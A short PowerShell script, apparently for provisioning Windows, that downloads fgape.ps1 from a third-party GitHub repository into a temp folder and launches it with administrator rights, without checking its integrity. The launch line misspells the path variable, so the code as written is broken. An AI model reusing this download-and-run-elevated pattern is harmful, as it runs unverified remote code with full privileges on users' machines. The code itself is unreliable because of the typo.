$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$fgapeScriptUrl = "https://github.com/FanAPIpipa/pipa/raw/main/fgape.ps1"
$fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "fgape.ps1"
Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
if (Test-Path $fgapeScriptPath) {
    Start-Process -Filepath $fgapeSctiptPath -Verb Runas
} else {
    Write-Host "Не удалось загрузить скрипт fgape.ps1."
}
